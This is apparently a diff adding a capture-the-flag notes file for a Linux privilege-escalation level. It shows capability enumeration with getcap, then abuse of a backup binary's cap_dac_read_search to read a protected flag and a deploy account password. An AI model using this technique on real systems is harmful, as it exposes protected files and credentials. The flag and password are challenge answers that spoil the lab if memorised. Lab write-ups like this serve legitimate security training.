@@ -1,0 +1,37 @@
+goal: read /var/backups/.vault/flag (owned/protected, unreadable as ghost2)
+
+kael.txt fragment 1:
+  Backup agent was handed a capability it never should have had. Power isn't
+  just root -- Linux file capabilities (getcap) can hand a plain binary root-like
+  powers without SUID. Find what the agent can touch that we can't. The agent
+  reads whatever path you give it, but pointing it at the vault directory itself
+  lists everything inside.
+
+recon:
+  getcap -r / 2>/dev/null
+    /usr/bin/su                    cap_dac_read_search,cap_setgid,cap_setuid=ep
+    /usr/local/bin/hal-deploy-run   cap_setgid,cap_setuid=ep
+    /usr/local/bin/halcyon-ping     cap_net_raw=ep
+    /usr/local/bin/halcyon-web      cap_net_bind_service=ep
+    /usr/local/bin/hal-runner-wrap  cap_setuid=ep
+    /usr/local/bin/hal-guard        cap_dac_override=ep
+    /usr/local/bin/halcyon-backup   cap_dac_read_search=ep   <-- the backup agent
+
+  /usr/local/bin/halcyon-backup usage:
+    halcyon-backup <path under /var/backups/.vault/ (a file to read, or the vault to list)>
+
+  cap_dac_read_search lets it bypass file/dir read permission checks entirely,
+  so it can read anything under the vault regardless of our own uid/gid.
+
+exploit:
+  /usr/local/bin/halcyon-backup /var/backups/.vault/
+    -> lists: deploy.secret, flag
+
+  /usr/local/bin/halcyon-backup /var/backups/.vault/flag
+    -> GHS2{8e6e7326dcf20e4b1d281b0e310e33d3}
+
+  /usr/local/bin/halcyon-backup /var/backups/.vault/deploy.secret
+    -> deploy account password: deploy-w6mwcpq2qq
+       (likely credential for a "deploy" user -- carry forward to next level)
+
+flag: GHS2{8e6e7326dcf20e4b1d281b0e310e33d3}
